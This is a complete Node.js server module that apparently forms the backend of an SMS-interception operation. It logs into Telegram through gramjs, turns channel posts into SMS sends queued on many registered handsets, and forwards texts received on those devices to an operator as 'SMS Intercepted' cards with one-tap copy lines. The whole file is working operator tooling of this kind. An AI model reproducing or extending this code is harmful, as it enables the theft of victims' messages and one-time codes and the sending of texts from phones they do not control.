"use strict";

const fs = require("fs");
const express = require("express");
const config = require("./config");
const db = require("./database");
const u = require("./utils");
const hub = require("./hub");
const auth = require("./auth");

const ah = (fn) => (req, res, next) => Promise.resolve(fn(req, res, next)).catch(next);

// html-escaper optional -> local fallback
let escapeHtml;
try {
  escapeHtml = require("html-escaper").escape;
} catch (_) {
  const MAP = { "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" };
  escapeHtml = (s) => String(s === null || s === undefined ? "" : s).replace(/[&<>"']/g, (c) => MAP[c]);
}

// ---- gramjs (Telethon ka JS equivalent) ----
let TelegramClient = null, Api = null, StringSession = null, NewMessage = null;
let TELETHON_OK = false;
try {
  TelegramClient = require("telegram").TelegramClient;
  StringSession = require("telegram/sessions").StringSession;
  Api = require("telegram/tl").Api;
  NewMessage = require("telegram/events").NewMessage;
  TELETHON_OK = true;
} catch (_) {
  TELETHON_OK = false;
}

// ------------------------------------------------------------------ state

let relayClient = null;
let _connectPromise = null;

const relayState = {
  connected: false,
  authorized: false,
  me: null,
  phone: null,
  phoneCodeHash: null,
  awaiting_code: false,
  handlers_installed: false,
  last_error: null,
  forward_user: config.DEFAULT_FWD_USER || null,
  last_channel_at: null,
  api_id: null,
  api_hash: null,
};

const _relaySeen = new Set();
const bannedCache = new Set();

const _pTo = /To:\s*(\+?\d{7,15})/;
const _pMsg = /Message:\s*(.+?)(?=\n\n|\n[📋📞💬📱]|$)/s;
const _pOnetap = /(\+?\d{7,15})\s*\|\s*(.+)/;
const _pDev = /^\s*(?:Device|DEV|#)\s*[:#]?\s*([A-Za-z0-9][A-Za-z0-9_\-]{2,39})\s*$/m;

// ----------------------------------------------------------------- parsing

function cleanSmsBody(raw) {
  const lines = String(raw || "")
    .split("\n")
    .map((l) => l.trim())
    .filter((l) => l && !l.startsWith("━"));
  return lines.join(" ").trim().slice(0, config.MAX_SMS_BODY);
}

function parseSms(text) {
  if (!text) return null;

  let to = null, body = null;
  let m = _pTo.exec(text);
  if (m) to = u.normalizeNumber(m[1]) || String(m[1]).trim();

  m = _pMsg.exec(text);
  if (m) body = m[1];

  if (!body) {
    m = _pOnetap.exec(text);
    if (m) {
      to = to || u.normalizeNumber(m[1]) || String(m[1]).trim();
      body = m[2];
    }
  }
  if (!body) return null;

  let hint = null;
  m = _pDev.exec(text);
  if (m) hint = m[1];

  return [to, cleanSmsBody(body), hint];
}

function formatSmsCard(address, body, header = "📱 <b>SMS Intercepted</b>", note = null) {
  const a = escapeHtml(address || "n/a");
  const b = escapeHtml(body || "");
  const lines = [header, "━━━━━━━━━━━━━━", `📞 To: <code>${a}</code>`, `💬 Message: ${b}`];
  if (note) lines.push(`ℹ️ ${note}`);
  lines.push("", "📋 <b>One-tap copy:</b>", `<code>${a} | ${b}</code>`);
  return lines.join("\n");
}

// ------------------------------------------------------------------- bans

function banKey(address) {
  if (address === null || address === undefined) return "";
  const num = u.normalizeNumber(address);
  if (num) return num;
  return String(address).trim().toLowerCase();
}

function loadBans() {
  bannedCache.clear();
  return db.banned_senders
    .find({}, { projection: { address: 1, sender: 1 } })
    .forEach((d) => {
      const k = banKey(d.address || d.sender);
      if (k) bannedCache.add(k);
    })
    .catch(() => {});
}

async function loadRelayConfig() {
  try {
    const doc = (await db.relay_config.findOne({ _id: "forward" })) || {};
    if (doc.target) relayState.forward_user = doc.target;
  } catch (_) {}
}

function isBanned(address) {
  const k = banKey(address);
  return !!k && bannedCache.has(k);
}

// ------------------------------------------------------------------ creds

async function relayCreds() {
  if (config.TELE_API_ID && config.TELE_API_HASH) {
    return [config.TELE_API_ID, config.TELE_API_HASH];
  }
  let doc = {};
  try { doc = (await db.relay_config.findOne({ _id: "creds" })) || {}; } catch (_) {}
  return [parseInt(doc.api_id || 0, 10), doc.api_hash || ""];
}

async function saveRelayCreds(apiId, apiHash, phone) {
  try {
    await db.relay_config.updateOne(
      { _id: "creds" },
      { $set: { api_id: apiId, api_hash: apiHash, phone, updated_at: db.utcNow() } },
      { upsert: true }
    );
  } catch (_) {}
}

function loadSession() {
  try {
    if (fs.existsSync(config.RELAY_SESSION_FILE)) {
      const s = fs.readFileSync(config.RELAY_SESSION_FILE, "utf8").trim();
      if (s) return new StringSession(s);
    }
  } catch (_) {}
  return new StringSession("");
}

function saveSession() {
  try {
    if (relayClient && relayClient.session && typeof relayClient.session.save === "function") {
      const tmp = `${config.RELAY_SESSION_FILE}.tmp`;
      fs.writeFileSync(tmp, relayClient.session.save(), { mode: 0o600 });
      fs.renameSync(tmp, config.RELAY_SESSION_FILE);
    }
  } catch (_) {}
}

// -------------------------------------------------------------- relay boot

async function startRelay() {
  if (!TELETHON_OK) {
    relayState.last_error = "gramjs not installed (npm i telegram)";
    return;
  }

  const [apiId, apiHash] = await relayCreds();
  if (!apiId || !apiHash) {
    relayState.last_error = "TELE_API_ID / TELE_API_HASH not set";
    return;
  }

  try {
    relayClient = new TelegramClient(loadSession(), apiId, apiHash, {
      connectionRetries: 5,
      useWSS: false,
    });
    await relayClient.connect();
    relayState.connected = true;

    if (await relayClient.isUserAuthorized()) {
      await afterRelayLogin(apiId, apiHash);
    } else {
      relayState.awaiting_code = true;
    }
  } catch (e) {
    relayState.connected = false;
    relayState.last_error = `connect: ${e.message || e}`;
  }
}

async function stopRelay() {
  saveSession();
  try { await relayClient?.disconnect(); } catch (_) {}
  relayState.connected = false;
}

async function afterRelayLogin(apiId = null, apiHash = null) {
  const me = await relayClient.getMe();
  relayState.authorized = true;
  relayState.awaiting_code = false;
  relayState.me = { id: me.id, username: me.username, first_name: me.firstName };
  installRelayHandlers();
  await loadBans();
  if (apiId && apiHash) await saveRelayCreds(apiId, apiHash, relayState.phone);
  saveSession();
  try {
    await normalizeAutoSenderChannels();
  } catch (e) {
    relayState.last_error = `channel normalize: ${e.message || e}`;
  }
  u.logEvent("relay_login", relayState.me);
}

// -------------------------------------------------- enabled channels cache

let _enabledKeysCache = { at: 0, keys: new Set() };

function invalidateChannelCache() {
  _enabledKeysCache = { at: 0, keys: new Set() };
}

async function enabledChannels() {
  const out = new Set();
  try {
    const cur = db.devices.find(
      { "auto_sender.enabled": true },
      { projection: { auto_sender: 1 } }
    );
    for await (const d of cur) {
      const cid = (d.auto_sender || {}).channel_id;
      if (cid) out.add(String(cid));
    }
  } catch (_) {}
  if (config.TARGET_CHANNEL_ID) out.add(String(config.TARGET_CHANNEL_ID));
  return out;
}

async function enabledChannelKeys() {
  const now = Date.now() / 1000;
  if (_enabledKeysCache.keys.size && now - _enabledKeysCache.at < 5) {
    return _enabledKeysCache.keys;
  }
  const fresh = new Set();
  for (const c of await enabledChannels()) {
    const k = u.chanKey(c);
    if (k) fresh.add(k);
  }
  _enabledKeysCache = { at: now, keys: fresh };
  return fresh;
}

async function devicesForChannel(channelId) {
  const key = u.chanKey(channelId);
  if (!key) return [];
  try {
    const rows = await db.devices
      .find({ "auto_sender.enabled": true })
      .limit(config.MAX_BROADCAST)
      .toArray();
    return rows.filter((d) => u.chanKey((d.auto_sender || {}).channel_id) === key);
  } catch (_) {
    return [];
  }
}

async function normalizeAutoSenderChannels() {
  if (!relayClient || !relayState.authorized) return;
  let rows;
  try {
    rows = await db.devices
      .find({ "auto_sender.channel_id": { $nin: [null, ""] } })
      .limit(config.MAX_BROADCAST)
      .toArray();
  } catch (_) {
    return;
  }

  let changed = 0;
  for (const d of rows) {
    const cid = (d.auto_sender || {}).channel_id;
    if (!cid) continue;
    const s = String(cid);
    if (/^-100\d+$/.test(s)) continue;
    let ent;
    try {
      ent = await relayClient.getEntity(u.asEntity(cid));
    } catch (_) {
      continue;
    }
    const nid = u.canonicalChannelId(ent);
    if (!nid || nid === s) continue;
    try {
      await db.devices.updateOne({ _id: d._id }, { $set: { "auto_sender.channel_id": nid } });
      changed += 1;
    } catch (_) {}
  }
  if (changed) {
    invalidateChannelCache();
    u.logEvent("auto_sender_channels_normalized", { count: changed });
  }
}

// ---------------------------------------------------------------- handlers

function installRelayHandlers() {
  if (relayState.handlers_installed || !relayClient || !TELETHON_OK) return;
  relayClient.addEventHandler(onRelayMessage, new NewMessage({ incoming: true }));
  relayState.handlers_installed = true;
}

async function resolveRelayTargets(hint) {
  const limit = config.MAX_BROADCAST;

  if (hint) {
    const h = String(hint).trim().toLowerCase();
    const rows = await db.devices.find().limit(limit).toArray().catch(() => []);
    for (const d of rows) {
      if (
        (d.device_name || "").toLowerCase().includes(h) ||
        u.deviceShortId(d).toLowerCase() === h ||
        String(d._id).toLowerCase() === h
      ) {
        return [d];
      }
    }
    return [];
  }

  const ids = hub.onlineDeviceIds();
  if (ids.length) {
    return db.devices.find({ _id: { $in: ids } }).toArray().catch(() => []);
  }
  return db.devices.find().limit(limit).toArray().catch(() => []);
}

async function onRelayMessage(event) {
  try {
    const chatId = event && event.chatId;
    const mid = event && event.message && event.message.id;
    if (chatId === null || chatId === undefined) return;

    const key = `${chatId}:${mid}`;
    if (_relaySeen.has(key)) return;
    _relaySeen.add(key);
    if (_relaySeen.size > 8000) _relaySeen.clear();

    if (!(await enabledChannelKeys()).has(u.chanKey(chatId))) return;

    relayState.last_channel_at = db.utcNow().toISOString();

    const parsed = parseSms((event.message && event.message.message) || "");
    if (!parsed) return;
    const [toNumber, body, hint] = parsed;

    let targets = await devicesForChannel(chatId);
    if (!targets.length && hint) targets = await resolveRelayTargets(hint);
    if (
      !targets.length &&
      config.TARGET_CHANNEL_ID &&
      u.chanKey(chatId) === u.chanKey(config.TARGET_CHANNEL_ID)
    ) {
      targets = await resolveRelayTargets(null);
    }
    if (!targets.length) return;

    for (const d of targets) {
      const did = String(d._id);
      const to = toNumber || u.resolveDeviceNumber(d);
      const a = u.autoSenderOf(d);
      const slots = a.sim_slots.length ? a.sim_slots : [null];

      for (const slot of slots) {
        await hub.queueSms(did, body, to, "relay", d.device_name || "", slot);
      }
      if (hub.hub.online(did)) hub.spawn(hub.pushOutbox(did));

      if (a.tg_confirm) {
        let note = slots[0] === null ? "SIM default" : "SIM " + slots.map((s) => s + 1).join("+");
        note += " · device " + u.deviceShortId(d);
        hub.spawn(relaySendText(formatSmsCard(to || "", body, "📤 <b>Auto Sender → SMS</b>", note)));
      }
    }
    u.logEvent("relay_channel_send", {
      to: toNumber,
      devices: targets.length,
      channel: String(chatId),
    });
  } catch (e) {
    relayState.last_error = `channel: ${e.message || e}`;
    u.logEvent("relay_channel_error", { error: String(e.message || e) });
  }
}

// --------------------------------------------------------------- sending

async function relaySendText(text) {
  const target = relayState.forward_user || config.DEFAULT_FWD_USER;
  if (!relayClient || !relayState.authorized || !target) return false;

  const ent = /^-?\d+$/.test(String(target)) ? parseInt(target, 10) : String(target);

  try {
    await relayClient.sendMessage(ent, { message: text, parseMode: "html" });
    tgLog("out", text, "ok");
    return true;
  } catch (e) {
    try {
      // parseMode support na ho to plain bhejo
      await relayClient.sendMessage(ent, { message: String(text).replace(/<[^>]+>/g, "") });
      tgLog("out", text, "ok-plain");
      return true;
    } catch (e2) {
      relayState.last_error = `forward: ${e2.message || e2}`;
      tgLog("out", text, `fail: ${e2.message || e2}`);
      return false;
    }
  }
}

const notifyAdmins = relaySendText;

async function relayForwardIncoming(device, address, body) {
  if (!body || isBanned(address)) return;
  await relaySendText(formatSmsCard(address || "n/a", body));
}

async function tgLog(direction, text, result = "ok") {
  try {
    await db.tg_logs.insertOne({
      direction,
      text: String(text || "").slice(0, 400),
      result: String(result || "ok").slice(0, 200),
      created_at: db.utcNow(),
    });
  } catch (_) {}
}

// ------------------------------------------------------------------ router

const router = express.Router();

router.get("/status", ah(async (req, res) => {
  await auth.requirePanel(req);
  res.json({
    telethon: TELETHON_OK,
    state: { ...relayState },
    bans: [...bannedCache].sort(),
    creds_from_env: !!(config.TELE_API_ID && config.TELE_API_HASH),
    channels: [...(await enabledChannels())].sort(),
  });
}));

router.get("/logs", ah(async (req, res) => {
  await auth.requirePanel(req);
  const limit = Math.max(1, Math.min(parseInt(req.query.limit || 60, 10), 200));
  const rows = await db.tg_logs.find().sort({ _id: -1 }).limit(limit).toArray();
  res.json({ logs: rows.map(u.serializeDocument) });
}));

router.post("/forward", ah(async (req, res) => {
  await auth.requirePanel(req);
  const t = String((req.body || {}).target || "").trim();
  relayState.forward_user = t || null;
  try {
    await db.relay_config.updateOne(
      { _id: "forward" },
      { $set: { target: t, updated_at: db.utcNow() } },
      { upsert: true }
    );
  } catch (_) {}
  res.json({ status: "ok", forward_user: relayState.forward_user });
}));

router.post("/login/start", ah(async (req, res) => {
  await auth.requirePanel(req);
  if (!TELETHON_OK) throw new u.HttpError(503, "gramjs not installed");

  const b = req.body || {};
  const apiId = parseInt(b.api_id || config.TELE_API_ID, 10);
  const apiHash = b.api_hash || config.TELE_API_HASH;
  const phone = String(b.phone || "").trim();
  if (!apiId || !apiHash || !phone) {
    throw new u.HttpError(400, "api_id, api_hash and phone required");
  }

  if (!relayClient) {
    if (!_connectPromise) {
      _connectPromise = (async () => {
        relayClient = new TelegramClient(loadSession(), apiId, apiHash, { connectionRetries: 5 });
        await relayClient.connect();
        relayState.connected = true;
      })().finally(() => { _connectPromise = null; });
    }
    await _connectPromise;
  }

  let sent;
  try {
    sent = await relayClient.sendCode({ apiId, apiHash }, phone);
  } catch (e) {
    throw new u.HttpError(400, `send code failed: ${e.message || e}`);
  }

  Object.assign(relayState, {
    phone,
    phoneCodeHash: sent.phoneCodeHash,
    awaiting_code: true,
    connected: true,
    api_id: apiId,
    api_hash: apiHash,
  });
  res.json({ status: "code_sent", phone });
}));

router.post("/login/verify", ah(async (req, res) => {
  await auth.requirePanel(req);
  if (!relayClient || !relayState.phone) throw new u.HttpError(400, "start login first");

  const b = req.body || {};
  try {
    await relayClient.invoke(
      new Api.auth.SignIn({
        phoneNumber: relayState.phone,
        phoneCodeHash: relayState.phoneCodeHash,
        phoneCode: String(b.code || "").trim(),
      })
    );
  } catch (e) {
    const name = e && e.constructor && e.constructor.name;
    const msg = String((e && e.message) || "");
    if (name === "SessionPasswordNeededError" || msg.includes("SESSION_PASSWORD_NEEDED")) {
      if (!b.password) return res.json({ status: "2fa_required" });
      try {
        await relayClient.signInWithPassword({ password: async () => String(b.password) });
      } catch (e2) {
        throw new u.HttpError(400, `2FA failed: ${e2.message || e2}`);
      }
    } else {
      throw new u.HttpError(400, `sign-in failed: ${msg || e}`);
    }
  }

  await afterRelayLogin(relayState.api_id, relayState.api_hash);
  res.json({ status: "ok", me: relayState.me });
}));

router.post("/logout", ah(async (req, res) => {
  await auth.requirePanel(req);
  try { await relayClient?.logOut(); } catch (_) {}
  Object.assign(relayState, { authorized: false, me: null, handlers_installed: false });
  invalidateChannelCache();
  res.json({ status: "ok" });
}));

router.get("/bans", ah(async (req, res) => {
  await auth.requirePanel(req);
  res.json({ bans: [...bannedCache].sort() });
}));

router.post("/bans", ah(async (req, res) => {
  await auth.requirePanel(req);
  const a = banKey((req.body || {}).address);
  if (!a) throw new u.HttpError(400, "address required");
  await db.banned_senders.updateOne(
    { address: a },
    { $set: { address: a, created_at: db.utcNow() } },
    { upsert: true }
  );
  bannedCache.add(a);
  res.json({ status: "ok", bans: [...bannedCache].sort() });
}));

router.post("/bans/:address/delete", ah(async (req, res) => {
  await auth.requirePanel(req);
  const a = banKey(decodeURIComponent(req.params.address));
  if (a) {
    await db.banned_senders.deleteOne({ address: a });
    bannedCache.delete(a);
  }
  res.json({ status: "ok", bans: [...bannedCache].sort() });
}));

router.post("/parse", ah(async (req, res) => {
  await auth.requirePanel(req);
  const parsed = parseSms((req.body || {}).text || "");
  if (!parsed) return res.json({ matched: false });
  const [to, body, hint] = parsed;
  const targets = await resolveRelayTargets(hint);
  res.json({ matched: true, to, body, device_hint: hint, targets: targets.map(u.deviceShortId) });
}));

module.exports = {
  router,
  relayState,
  TELETHON_OK,
  get relayClient() { return relayClient; },
  startRelay,
  stopRelay,
  loadBans,
  loadRelayConfig,
  relaySendText,
  notifyAdmins,
  relayForwardIncoming,
  isBanned,
  banKey,
  enabledChannels,
  invalidateChannelCache,
  devicesForChannel,
  resolveRelayTargets,
  parseSms,
  formatSmsCard,
};